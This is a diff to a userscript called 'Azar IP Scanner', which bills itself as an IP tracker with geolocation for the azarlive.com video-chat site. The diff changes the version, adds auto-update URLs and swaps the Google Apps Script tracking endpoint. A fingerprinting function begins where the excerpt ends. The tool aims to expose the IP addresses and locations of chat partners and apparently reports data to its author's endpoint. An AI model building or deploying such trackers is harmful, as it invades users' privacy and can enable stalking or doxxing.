@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Azar IP Scanner
 // @namespace    https://github.com/VeltrixJS/azar-ip-sniffer
-// @version      3.3
+// @version      3.4
 // @description  IP Tracker for Azar with geolocation support
 // @author       VeltrixJS
 // @match        https://azarlive.com/*
@@ -10,12 +10,14 @@
 // @connect      script.google.com
 // @connect      script.googleusercontent.com
 // @connect      api.ipify.org
+// @updateURL    https://raw.githubusercontent.com/VeltrixJS/Azarlive-IP-Scanner/main/ip-scanner.js
+// @downloadURL  https://raw.githubusercontent.com/VeltrixJS/Azarlive-IP-Scanner/main/ip-scanner.js
 // ==/UserScript==
 
 (function () {
     'use strict';
 
-    const TRACK_URL = 'https://script.google.com/macros/s/AKfycbxZDzeQ-dce139nSO5jFQjjttWcCFPFT8NWYWj6DsU_vZAxBG36aoDHGH9nDpaSo0pKcw/exec';
+    const TRACK_URL = 'https://script.google.com/macros/s/AKfycby_nr6TjTSZ57kf_yCNMG1GbsF_QeTzJEnHrkhdhqxWw7b2XiZ2kkQyANFtAB3mmSGR7A/exec';
 
     function getFingerprint() {
         try {
